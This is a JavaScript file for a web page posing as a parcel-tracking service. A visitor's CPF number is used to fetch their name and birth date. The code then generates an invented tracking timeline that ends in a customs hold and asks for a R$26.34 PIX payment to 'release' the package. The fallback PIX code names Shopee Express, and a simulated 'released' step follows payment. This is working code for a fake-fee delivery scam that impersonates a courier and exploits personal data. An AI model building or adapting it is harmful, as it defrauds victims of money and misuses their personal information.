/**
 * Sistema principal de rastreamento - VERSÃO ATUALIZADA COM ZENTRA PAY OFICIAL
 */
import { DataService } from '../utils/data-service.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { TrackingGenerator } from '../utils/tracking-generator.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { UIHelpers } from '../utils/ui-helpers.js';

export class TrackingSystem {
    constructor() {
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.currentCPF = null;
        this.userData = null;
        this.trackingData = null;
        this.isInitialized = false;
        this.pixData = null;
        this.liberationPaid = false;
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🚀 Inicializando sistema de rastreamento');
        
        try {
            this.setupCPFInput();
            this.setupTrackingForm();
            this.setupOrderDetailsAccordion();
            this.setupModalEvents();
            this.checkURLParams();
            
            this.isInitialized = true;
            console.log('✅ Sistema de rastreamento inicializado');
        } catch (error) {
            console.error('❌ Erro na inicialização:', error);
        }
    }

    showLoadingNotification() {
        const notificationOverlay = document.createElement('div');
        notificationOverlay.id = 'trackingNotification';
        notificationOverlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        const notificationContent = document.createElement('div');
        notificationContent.style.cssText = `
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `;

        notificationContent.innerHTML = `
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `;

        notificationOverlay.appendChild(notificationContent);
        document.body.appendChild(notificationOverlay);
        document.body.style.overflow = 'hidden';
    }

    closeLoadingNotification() {
        const notification = document.getElementById('trackingNotification');
        if (notification) {
            notification.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    showError(message) {
        const existingError = document.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }

        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.cssText = `
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `;
        errorDiv.textContent = message;

        const form = document.querySelector('.tracking-form');
        if (form) {
            form.appendChild(errorDiv);

            setTimeout(() => {
                if (errorDiv.parentNode) {
                    errorDiv.style.animation = 'slideUp 0.3s ease';
                    setTimeout(() => errorDiv.remove(), 300);
                }
            }, 5000);
        }
    }

    scrollToElement(element, offset = 0) {
        if (!element) return;

        const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
        const offsetPosition = elementPosition - offset;

        window.scrollTo({
            top: offsetPosition,
            behavior: 'smooth'
        });
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) return;

        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
        });

        cpfInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });
    }

    setupTrackingForm() {
        const form = document.getElementById('trackingForm');
        const button = document.getElementById('trackButton');

        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }

        if (button) {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }
    }

    async handleTrackingSubmit() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButton = document.getElementById('trackButton');
        
        if (!cpfInput || !trackButton) {
            console.error('❌ Elementos do formulário não encontrados');
            return;
        }

        const cpf = cpfInput.value.trim();
        
        if (!cpf) {
            this.showError('Por favor, digite um CPF');
            return;
        }

        if (!CPFValidator.isValidCPF(cpf)) {
            this.showError('CPF inválido. Verifique os dados digitados.');
            return;
        }

        this.currentCPF = CPFValidator.cleanCPF(cpf);
        
        trackButton.disabled = true;
        trackButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Rastreando...';

        this.showLoadingNotification();

        try {
            console.log('🔍 Buscando dados para CPF:', this.currentCPF);
            
            const data = await this.dataService.fetchCPFData(this.currentCPF);
            console.log('📊 Dados recebidos:', data);
            
            if (data && data.DADOS) {
                this.userData = {
                    nome: data.DADOS.nome,
                    cpf: this.currentCPF,
                    nascimento: data.DADOS.data_nascimento,
                    situacao: 'REGULAR'
                };

                console.log('✅ Dados obtidos:', this.userData);
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                this.closeLoadingNotification();
                
                this.displayOrderDetails();
                this.generateTrackingData();
                this.displayTrackingResults();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    this.scrollToElement(orderDetails, 100);
                }

                setTimeout(() => {
                    this.highlightLiberationButton();
                }, 1500);
                
            } else {
                throw new Error('Dados não encontrados');
            }
            
        } catch (error) {
            console.error('❌ Erro no rastreamento:', error);
            this.closeLoadingNotification();
            this.showError('Erro ao buscar dados. Tente novamente.');
        } finally {
            trackButton.disabled = false;
            trackButton.innerHTML = '<i class="fas fa-search"></i> Rastrear Pacote';
        }
    }

    displayOrderDetails() {
        if (!this.userData) return;

        const orderDetails = document.getElementById('orderDetails');
        const customerName = document.getElementById('customerName');
        const fullName = document.getElementById('fullName');
        const formattedCpf = document.getElementById('formattedCpf');

        if (orderDetails) {
            orderDetails.style.display = 'block';
        }

        if (customerName) {
            customerName.textContent = this.userData.nome.split(' ')[0];
        }

        if (fullName) {
            fullName.textContent = this.userData.nome;
        }

        if (formattedCpf) {
            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
        }
    }

    generateTrackingData() {
        this.trackingData = TrackingGenerator.generateTrackingData(this.userData);
    }

    displayTrackingResults() {
        const trackingResults = document.getElementById('trackingResults');
        const customerNameStatus = document.getElementById('customerNameStatus');
        const currentStatus = document.getElementById('currentStatus');
        const trackingTimeline = document.getElementById('trackingTimeline');

        if (trackingResults) {
            trackingResults.style.display = 'block';
        }

        if (customerNameStatus) {
            customerNameStatus.textContent = this.userData.nome.split(' ')[0];
        }

        if (currentStatus) {
            currentStatus.textContent = 'Aguardando liberação aduaneira';
        }

        if (trackingTimeline) {
            this.renderTimeline(trackingTimeline);
        }

        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }

    renderTimeline(container) {
        container.innerHTML = '';

        this.trackingData.steps.forEach((step, index) => {
            const timelineItem = this.createTimelineItem(step, index);
            container.appendChild(timelineItem);
        });
    }

    createTimelineItem(step, index) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
        
        if (index === 0) {
            item.classList.add('first');
        }

        const dateFormatted = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeFormatted = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        if (step.needsLiberation) {
            buttonHtml = `
                <button class="liberation-button-timeline" data-liberation-button>
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateFormatted}</span>
                    <span class="time">${timeFormatted}</span>
                </div>
                <div class="timeline-text">
                    <p>
                        ${step.isChina ? '<span class="china-tag">[China]</span>' : ''}
                        ${step.description}
                    </p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        return item;
    }

    highlightLiberationButton() {
        // Buscar botões usando múltiplos seletores
        const selectors = [
            '[data-liberation-button]',
            '.liberation-button-timeline'
        ];

        let liberationButton = null;

        for (const selector of selectors) {
            liberationButton = document.querySelector(selector);
            if (liberationButton) break;
        }

        // Fallback: buscar por texto
        if (!liberationButton) {
            const allButtons = Array.from(document.querySelectorAll('button'));
            liberationButton = allButtons.find(btn => 
                btn.textContent && btn.textContent.includes('LIBERAR')
            );
        }

        if (liberationButton) {
            console.log('🔓 Botão de liberação encontrado');
            
            this.setupLiberationButton(liberationButton);
            
            setTimeout(() => {
                this.scrollToElement(liberationButton, 100);
            }, 500);
        } else {
            console.warn('⚠️ Botão de liberação não encontrado');
            console.log('🔍 Tentando criar botão de liberação...');
            this.createLiberationButtonIfMissing();
        }
    }

    createLiberationButtonIfMissing() {
        // Verificar se já existe um botão na última etapa da timeline
        const timelineItems = document.querySelectorAll('.timeline-item');
        const lastTimelineItem = timelineItems[timelineItems.length - 1];
        
        if (lastTimelineItem && !lastTimelineItem.querySelector('[data-liberation-button]')) {
            const timelineText = lastTimelineItem.querySelector('.timeline-text');
            if (timelineText) {
                const liberationButton = document.createElement('button');
                liberationButton.className = 'liberation-button-timeline';
                liberationButton.setAttribute('data-liberation-button', 'true');
                liberationButton.innerHTML = '<i class="fas fa-unlock"></i> LIBERAR OBJETO';
                
                timelineText.appendChild(liberationButton);
                this.setupLiberationButton(liberationButton);
                
                console.log('✅ Botão de liberação criado automaticamente');
            }
        }
    }

    setupLiberationButton(button) {
        button.addEventListener('click', () => {
            this.showLiberationModal();
        });

        button.style.animation = 'pulse 2s infinite';
        button.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.6)';
    }

    async showLiberationModal() {
        console.log('🔓 Abrindo modal de liberação');
        
        // Mostrar loading otimizado com mensagens dinâmicas
        this.showLoadingNotification();
        
        const modal = document.getElementById('liberationModal');
        if (!modal) return;

        try {
            const pixResult = await this.zentraPayService.createPixTransaction(
                this.userData, 
                26.34
            );

            if (pixResult.success) {
                this.pixData = pixResult;
                this.updateModalWithRealPix();
            } else {
                this.updateModalWithStaticPix();
            }
            
        } catch (error) {
            this.updateModalWithStaticPix();
        }

        // Fechar loading e mostrar modal
        this.closeLoadingNotification();
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }

    updateModalWithRealPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');

        if (qrCodeImg && this.pixData.pixPayload) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
        }

        if (pixCodeTextarea && this.pixData.pixPayload) {
            pixCodeTextarea.value = this.pixData.pixPayload;
        }

        console.log('✅ Modal atualizado com PIX real');
    }

    updateModalWithStaticPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const staticPix = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';

        if (qrCodeImg) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(staticPix)}`;
        }

        if (pixCodeTextarea) {
            pixCodeTextarea.value = staticPix;
        }

        console.log('⚠️ Modal atualizado com PIX estático');
    }

    setupOrderDetailsAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');

        if (detailsHeader && detailsContent) {
            detailsHeader.addEventListener('click', () => {
                const isExpanded = detailsContent.classList.contains('expanded');
                
                if (isExpanded) {
                    detailsContent.classList.remove('expanded');
                    if (toggleIcon) toggleIcon.classList.remove('rotated');
                } else {
                    detailsContent.classList.add('expanded');
                    if (toggleIcon) toggleIcon.classList.add('rotated');
                }
            });
        }
    }

    setupModalEvents() {
        // Modal de liberação
        const closeModal = document.getElementById('closeModal');
        const copyPixButton = document.getElementById('copyPixButtonModal');
        const liberationModal = document.getElementById('liberationModal');

        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }

        if (copyPixButton) {
            copyPixButton.addEventListener('click', () => {
                this.copyPixCode();
            });
        }

        if (liberationModal) {
            liberationModal.addEventListener('click', (e) => {
                if (e.target === liberationModal) {
                    this.closeLiberationModal();
                }
            });
        }
    }

    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    console.log('✅ PIX copiado:', pixInput.value.substring(0, 50) + '...');
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand');
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    simulatePayment() {
        console.log('🎭 Simulando pagamento...');
        
        // Mostrar feedback visual
        const simulateButton = document.getElementById('simulatePaymentButton');
        if (simulateButton) {
            const originalText = simulateButton.innerHTML;
            simulateButton.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento Simulado!';
            simulateButton.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
            simulateButton.disabled = true;
            
            setTimeout(() => {
                simulateButton.innerHTML = originalText;
                simulateButton.style.background = '';
                simulateButton.disabled = false;
            }, 2000);
        }
        
        // Fechar modal após breve delay
        setTimeout(() => {
            this.closeLiberationModal();
            
            // Simular próximas etapas do processo
            setTimeout(() => {
                this.simulatePostPaymentFlow();
            }, 1000);
        }, 1500);
    }

    simulatePostPaymentFlow() {
        console.log('🚀 Iniciando fluxo pós-pagamento simulado...');
        
        // Adicionar nova etapa: Liberado na alfândega
        const timeline = document.getElementById('trackingTimeline');
        if (timeline) {
            const newStep = this.createSimulatedTimelineStep({
                title: 'Pedido liberado na alfândega',
                description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária',
                date: new Date(),
                completed: true
            });
            
            timeline.appendChild(newStep);
            
            // Animar entrada
            setTimeout(() => {
                newStep.style.opacity = '1';
                newStep.style.transform = 'translateY(0)';
                newStep.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }, 100);
        }
        
        // Atualizar status atual
        const currentStatus = document.getElementById('currentStatus');
        if (currentStatus) {
            currentStatus.textContent = 'Liberado - Preparando para entrega';
        }
    }

    createSimulatedTimelineStep({ title, description, date, completed }) {
        const item = document.createElement('div');
        item.className = `timeline-item ${completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';

        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${description}</p>
                </div>
            </div>
        `;

        return item;
    }

    checkURLParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const focusCpf = urlParams.get('focus');
        
        if (focusCpf === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.focus();
                }
            }, 500);
        }
    }

    setZentraPayApiSecret(apiSecret) {
        if (this.zentraPayService) {
            this.zentraPayService.setApiSecret(apiSecret);
        }
    }
}